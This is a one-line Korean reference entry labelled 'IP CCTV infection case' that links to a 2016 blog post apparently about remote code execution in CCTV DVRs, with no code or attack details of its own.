

IP CCTV 감염 사례 : http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html
